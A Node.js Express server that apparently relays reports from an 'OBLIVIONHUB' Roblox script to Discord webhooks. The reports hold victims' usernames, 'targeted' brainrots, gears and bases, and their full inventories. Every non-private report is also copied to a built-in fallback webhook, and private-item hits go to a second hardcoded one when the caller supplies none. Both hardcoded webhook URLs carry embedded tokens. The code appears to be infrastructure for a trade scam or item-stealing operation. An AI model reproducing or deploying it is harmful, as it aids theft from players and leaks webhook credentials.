const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const FALLBACK_WEBHOOK = 'https://discord.com/api/webhooks/1528664955258277940/DYi4QqN2pr93CM35VxOzy9MZ6eA2Fl408SuHHKgIvmsTtCcepASPG45NDsxXw_veRMA-';

app.use(express.json());

app.get('/webhook', (req, res) => {
    res.json({ status: 'ok', message: 'API funcionando correctamente' });
});

app.post('/webhook', async (req, res) => {
    try {
        const data = req.body;

        const player = data.playerName || 'Desconocido';
        const target = data.targetName || 'Desconocido';
        const targetId = data.targetId || 0;
        const webhookUrl = data.webhookUrl;
        const hasPrivateItem = data.hasPrivateItem || false;

        const brainTargeted = data.brainTargeted || [];
        const baseTargeted = data.baseTargeted || [];
        const gearTargeted = data.gearTargeted || [];

        const privateBrainTargeted = data.privateBrainTargeted || [];
        const privateBaseTargeted = data.privateBaseTargeted || [];
        const privateGearTargeted = data.privateGearTargeted || [];

        const allBrainrots = data.brainrots || [];
        const allBases = data.bases || [];
        const allGears = data.gears || [];

        const timestamp = data.timestamp || Date.now();

        function formatListWithCount(list) {
            if (!list || list.length === 0) return 'NONE';
            const counts = {};
            list.forEach(item => {
                counts[item] = (counts[item] || 0) + 1;
            });
            const formatted = Object.keys(counts).map(name => {
                return counts[name] > 1 ? `${name} (x${counts[name]})` : name;
            });
            return formatted.join(', ');
        }

        function truncateText(text, maxLength = 1024) {
            if (text.length <= maxLength) return text;
            return text.substring(0, maxLength - 3) + '...';
        }

        const allBrainrotNames = allBrainrots.map(item => item.displayName);
        const allBaseNames = allBases.map(item => item.displayName);
        const allGearNames = allGears.map(item => item.displayName);
        const allItems = [...allBrainrotNames, ...allBaseNames, ...allGearNames];

        let displayBrainTargeted, displayBaseTargeted, displayGearTargeted;
        if (hasPrivateItem) {
            displayBrainTargeted = privateBrainTargeted;
            displayBaseTargeted = privateBaseTargeted;
            displayGearTargeted = privateGearTargeted;
        } else {
            displayBrainTargeted = brainTargeted;
            displayBaseTargeted = baseTargeted;
            displayGearTargeted = gearTargeted;
        }

        // Verificar si hay AL MENOS UN ítem targeteado
        const hasTargetedItems =
            displayBrainTargeted.length > 0 ||
            displayBaseTargeted.length > 0 ||
            displayGearTargeted.length > 0;

        // Si no hay ningún ítem targeteado, no enviamos notificación
        if (!hasTargetedItems) {
            console.log('📭 Sin ítems targeteados. No se envía notificación.');
            return res.status(204).send(); // No Content
        }

        const targetedSet = new Set([
            ...displayBrainTargeted,
            ...displayBaseTargeted,
            ...displayGearTargeted
        ]);

        const untargetedItems = allItems.filter(item => !targetedSet.has(item));

        const brainTargetedStr = formatListWithCount(displayBrainTargeted);
        const gearTargetedStr = formatListWithCount(displayGearTargeted);
        const baseTargetedStr = formatListWithCount(displayBaseTargeted);
        const untargetedStr = formatListWithCount(untargetedItems);

        const date = new Date(timestamp);
        const formattedDate = date.toLocaleDateString('es-ES', {
            timeZone: 'UTC',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit'
        }).replace(/\//g, '-');

        // Construir el embed
        const embed = {
            title: '✅ OBLIVIONHUB SUCCESS',
            color: hasPrivateItem ? 0xffd700 : 0x00ff00,
            fields: [
                {
                    name: '👤 Username',
                    value: player,
                    inline: false
                },
                {
                    name: '🧠 Brainrots targeted',
                    value: brainTargetedStr,
                    inline: false
                },
                {
                    name: '⚙️ Gears targeted',
                    value: gearTargetedStr,
                    inline: false
                },
                {
                    name: '🎨 Bases targeted',
                    value: baseTargetedStr,
                    inline: false
                },
                {
                    name: '📦 UN-TARGETED ITEMS',
                    value: truncateText(untargetedStr),
                    inline: false
                }
            ],
            footer: {
                text: `OBLIVIONHUB | discord.gg/oblivionhub | oblivionhub.xyz • ${formattedDate}`
            }
        };

        // Si es privado, agregar @everyone al título
        let content = null;
        if (hasPrivateItem) {
            content = '@everyone **¡Se ha detectado un trade con ítems privados!**';
        }

        const payload = {
            content: content,
            embeds: [embed]
        };

        const webhooksToSend = [];

        if (hasPrivateItem) {
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            } else {
                webhooksToSend.push('https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L');
            }
        } else {
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            }
            webhooksToSend.push(FALLBACK_WEBHOOK);
        }

        for (const url of webhooksToSend) {
            let retries = 3;
            let success = false;
            while (retries > 0 && !success) {
                try {
                    await axios.post(url, payload);
                    console.log(`✅ Enviado a: ${url}`);
                    success = true;
                } catch (err) {
                    if (err.response && err.response.status === 429) {
                        const retryAfter = parseInt(err.response.headers['retry-after']) || 5;
                        console.log(`⏳ Rate limit en ${url}. Esperando ${retryAfter} segundos...`);
                        await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                        retries--;
                    } else {
                        console.error(`❌ Error enviando a ${url}:`, err.message);
                        retries = 0;
                    }
                }
            }
        }

        res.status(200).json({ status: 'ok', message: 'Notificaciones enviadas' });
    } catch (error) {
        console.error('❌ Error general:', error.message);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
});
